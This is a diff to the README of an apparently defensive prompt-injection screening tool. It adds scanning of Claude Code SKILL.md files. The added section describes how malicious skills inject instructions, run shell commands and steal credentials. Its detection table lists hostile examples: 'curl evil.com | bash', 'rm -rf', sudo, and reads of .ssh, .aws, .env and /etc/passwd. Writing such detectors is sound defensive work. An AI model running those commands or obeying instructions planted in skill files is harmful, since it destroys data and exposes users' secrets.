@@ -59,6 +59,7 @@ That's it! You now have a security screening layer for AI inputs.
 - [Usage](#-usage)
   - [REST API](#rest-api)
   - [MCP Server](#mcp-server-for-claude-cursor-etc)
+- [Skill Scanning](#️-skill-scanning-new)
 - [Response Schema](#-response-schema)
 - [Category Taxonomy](#️-category-taxonomy)
 - [Severity Levels](#-severity-levels)
@@ -106,6 +107,7 @@ Results are aggregated with severity levels and categorical tags, giving you act
 ## ✨ Features
 
 - 🔍 **Dual-Layer Detection** — LLM semantic analysis + static pattern matching
+- 🛡️ **Skill Scanning** — Specialized scanning for Claude Code SKILL.md files to detect malicious instructions
 - 🌍 **Multilingual Support** — Catches attacks in any language (German, Chinese, etc.)
 - 🔐 **Obfuscation Detection** — Decodes and analyzes Base64, hidden HTML comments, encoded payloads
 - 🎭 **Social Engineering Detection** — Identifies role-play jailbreaks, fake authorization claims, "sandwiched" attacks
@@ -221,12 +223,86 @@ Add to your MCP settings configuration:
 }
 ```
 
-**Tool:** `check_prompt`
+**Tools:**
 
-**Input Schema:**
+1. **`check_prompt`** - Check user prompts for injection attacks
+   ```json
+   {
+     "prompt": "The user input string to analyze"
+   }
+   ```
+
+2. **`scan_skill`** - Scan SKILL.md files for security vulnerabilities
+   ```json
+   {
+     "skillContent": "The raw markdown content of the SKILL.md file"
+   }
+   ```
+
+---
+
+## 🛡️ Skill Scanning (NEW)
+
+In addition to screening user prompts, Prompt Rejector now includes specialized scanning for Claude Code skill files (SKILL.md). Skills are markdown documents that define custom commands and behaviors, making them potential vectors for prompt injection and malicious tool usage.
+
+### Why Scan Skills?
+
+SKILL.md files are essentially persistent prompt injections with filesystem access. Malicious skills can:
+- Execute arbitrary commands via the Bash tool
+- Access sensitive files (SSH keys, credentials, .env files)
+- Exfiltrate data through network requests
+- Hide malicious instructions in comments or encoded content
+- Use social engineering to appear legitimate
+
+### Scanning a Skill
+
+**REST API:**
+```bash
+curl -X POST http://localhost:3000/v1/scan-skill \
+  -H "Content-Type: application/json" \
+  -d '{"skillContent": "# My Skill\n## Instructions\nHelp users code..."}'
+```
+
+**MCP Tool:**
+```json
+// Tool name: scan_skill
+// Arguments:
+{
+  "skillContent": "# My Skill\n## Instructions\n..."
+}
+```
+
+### What Gets Detected
+
+The skill scanner checks for:
+
+| Threat Category | Detection Examples |
+|----------------|-------------------|
+| **Hidden Instructions** | HTML comments with malicious commands |
+| **Dangerous Tool Usage** | `curl evil.com \| bash`, `rm -rf`, `sudo` commands |
+| **Sensitive File Access** | Reading `.ssh/`, `.aws/`, `.env`, `/etc/passwd` |
+| **Obfuscation** | Base64, hex encoding, Unicode tricks |
+| **Social Engineering** | Fake authority claims, urgency language |
+| **Data Exfiltration** | Network requests with credential parameters |
+
+### Response Schema
+
 ```json
 {
-  "prompt": "The user input string to analyze"
+  "safe": false,
+  "overallSeverity": "critical",
+  "geminiConfidence": 0.95,
+  "categories": ["shell_injection", "data_exfiltration", "obfuscation"],
+  "skillSpecific": {
+    "hasDangerousToolUsage": true,
+    "hasNetworkExfiltration": true,
+    "findings": [
+      "Dangerous tool usage detected: curl to external domain",
+      "Potential data exfiltration detected"
+    ]
+  },
+  "gemini": { /* LLM analysis results */ },
+  "static": { /* Pattern matching results */ }
 }
 ```
 
@@ -237,7 +313,8 @@ Add to your MCP settings configuration:
 | Field | Type | Description |
 |-------|------|-------------|
 | `safe` | `boolean` | `true` if input appears safe, `false` if potentially malicious |
-| `overallConfidence` | `number` | 0.0 - 1.0 confidence score |
+| `overallConfidence` | `number` | 0.0 - 1.0 confidence score (for prompt checking) |
+| `geminiConfidence` | `number` | 0.0 - 1.0 confidence score from LLM analysis (for skill scanning) |
 | `overallSeverity` | `string` | `"low"` \| `"medium"` \| `"high"` \| `"critical"` |
 | `categories` | `string[]` | Merged categories from both analyzers |
 | `gemini` | `object` | Detailed results from semantic analysis |
@@ -252,12 +329,13 @@ Add to your MCP settings configuration:
 |----------|--------|-------------|
 | `prompt_injection` | Gemini | Direct attempts to override system instructions |
 | `social_engineering` | Gemini | Manipulation, fake authority claims, role-play jailbreaks |
-| `obfuscation` | Gemini | Base64 encoding, hidden comments, Unicode tricks |
+| `obfuscation` | Gemini/Skill | Base64 encoding, hidden comments, Unicode tricks |
 | `multilingual` | Gemini | Non-English attacks attempting to bypass filters |
 | `xss` | Static | Cross-site scripting payloads |
 | `sqli` | Static | SQL injection patterns |
-| `shell_injection` | Static | Command injection, dangerous shell characters |
+| `shell_injection` | Static/Skill | Command injection, dangerous shell characters |
 | `directory_traversal` | Static | Path traversal attempts (`../`) |
+| `data_exfiltration` | Skill | Network requests with sensitive data, credential theft |
 
 ---
 
@@ -712,18 +790,18 @@ async function secureAgentProcess(userMessage, agent) {
       // Hard block - don't even log the content
       await alertSecurityTeam(securityCheck);
       return { error: 'Request blocked for security reasons', code: 'SECURITY_BLOCK' };
-    
+
     case 'high':
       // Block but log for analysis
       await logSecurityEvent(securityCheck, userMessage);
       return { error: 'Request flagged for security review', code: 'SECURITY_FLAG' };
-    
+
     case 'medium':
       // Allow but monitor closely
       await logSecurityEvent(securityCheck, userMessage);
       // Fall through to process
       break;
-    
+
     case 'low':
       // Normal processing
       break;
@@ -731,6 +809,42 @@ async function secureAgentProcess(userMessage, agent) {
 
   // Step 3: Safe to proceed
   return await agent.process(userMessage);
+}
+```
+
+### Skill Installation Security Pattern
+
+```javascript
+// Scan skills before installation
+async function installSkillSafely(skillPath) {
+  const fs = require('fs').promises;
+
+  // Step 1: Read the skill file
+  const skillContent = await fs.readFile(skillPath, 'utf-8');
+
+  // Step 2: Scan for security issues
+  const scanResult = await fetch('http://localhost:3000/v1/scan-skill', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ skillContent })
+  }).then(r => r.json());
+
+  // Step 3: Block unsafe skills
+  if (!scanResult.safe) {
+    console.error(`❌ Skill installation blocked: ${scanResult.overallSeverity}`);
+    console.error(`Categories: ${scanResult.categories.join(', ')}`);
+
+    if (scanResult.skillSpecific.findings.length > 0) {
+      console.error('\nSecurity findings:');
+      scanResult.skillSpecific.findings.forEach(f => console.error(`  • ${f}`));
+    }
+
+    throw new Error('Skill failed security scan');
+  }
+
+  // Step 4: Safe to install
+  console.log('✅ Skill passed security scan, installing...');
+  await installToSkillDirectory(skillPath);
 }
 ```
 
